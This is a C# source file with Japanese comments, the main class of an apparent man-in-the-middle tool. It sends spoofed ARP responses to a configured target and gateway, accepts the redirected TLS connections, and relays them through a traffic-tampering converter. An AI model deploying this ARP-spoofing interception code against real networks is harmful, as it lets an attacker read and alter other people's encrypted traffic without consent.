using System.Net;
using System.Net.Sockets;

namespace capture
{
    public class MitmMain
    {
        /// <summary>
        /// 中間者サーバー
        /// </summary>
        private static TcpListener MitmServer;

        /// <summary>
        /// 改ざんクラス
        /// </summary>
        public static IConverter Converter;

        /// <summary>
        /// コンストラクタ
        /// </summary>
        public MitmMain()
        {
            // 設定ファイル読み込み
            Configure.Load();

            // 初期化
            MitmServer = new TcpListener(IPAddress.Any, Configure.InspectTargetSslPort);
            Converter = new MitmScriptConverter();

            // パケットキャプチャ初期化
            PacketTamper.Initialize(
                Configure.InterfaceIndex, 
                Configure.TargetIP, 
                Configure.TargetMac, 
                Configure.GatewayIP, 
                Configure.GatewayMac);

            PacketTamper.InspectTargetSslPort = Configure.InspectTargetSslPort;
        }

        /// <summary>
        /// キャプチャ停止
        /// </summary>
        public void Stop()
        {
            PacketTamper.Stop();
        }


        /// <summary>
        /// 対象インターフェースの情報を表示する
        /// </summary>
        public void Show()
        {
            Log.Info("InterfaceIndex=" + Configure.InterfaceIndex);
            Log.Info(NicInformation.GetInterfaceString(Configure.InterfaceIndex));
        }

        /// <summary>
        /// SSLサーバーを起動して待ち受けするループを実行する
        /// </summary>
        public void Loop()
        {
            // 中間者サーバーリッスン開始
            Log.Info("Server Listen Start");
            MitmServer.Start();

            // キャプチャ開始
            Log.Info("Capture Start");
            PacketTamper.Start();

            // 偽装ARP Responseを送信するスレッドを起動
            Log.Info("Arp response sending Start");
            PacketTamper.ArpSpoofing();

            // 本スレッドにてLoop
            while (true)
            {
                // 新規コネクションを待つ
                Log.Info("Wait New Client...");
                var newclient = MitmServer.AcceptTcpClient();

                // 接続してきたクライアントのエンドポイント情報を取得
                var endpoint = (IPEndPoint)newclient.Client.RemoteEndPoint;
                Log.Info("New Client Coming="+endpoint.Address + ":" + endpoint.Port);

                // セッションを確認してもともとクライアントが接続したかったIPを取得
                foreach (var ss in HookManager.HookSessions)
                {
                    if (endpoint.Port == ss.SourcePort)
                    {
                        // 新規MITMセッションを生成
                        var mitm = new Mitm(newclient);

                        mitm.Converter = MitmMain.Converter;
                        mitm.MinimumSizeToOriginalServer = Configure.MinimumSizeToOriginalServer;
                        mitm.MinimumSizeToTarget = Configure.MinimumSizeToTarget;
                        mitm.OriginalServerHostName = Configure.ServerHostName;
                        mitm.ReadBufferSize = Configure.ReadBufferSize;

                        // 新規クライアント用の傍受スレッドを起動
                        // DestinationPortは基本的には443となる
                        mitm.Start(ss.DestinationAddress, ss.DestinationPort);

                        break;
                    }
                }        
            }
        }
    }
}
